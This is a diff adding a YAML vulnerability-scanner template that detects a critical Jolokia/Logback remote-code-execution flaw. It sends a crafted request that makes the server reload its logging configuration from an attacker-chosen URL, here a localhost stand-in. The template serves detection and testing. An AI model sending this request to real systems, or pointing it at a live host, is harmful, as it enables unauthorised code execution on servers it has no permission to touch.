@@ -1,0 +1,25 @@
+id: poc-yaml-jolokia-logback-jndi-rce
+info:
+  name: Jolokia Logback JNDI Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,jolokia,logback
+http:
+  - method: GET
+    path:
+      - "/actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:4321!/upload!/logback.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "127.0.0.1:4321"
+          - "JMXConfigurator.java"
+      - type: word
+        part: body
+        words:
+          - "<html"
+        negative: true
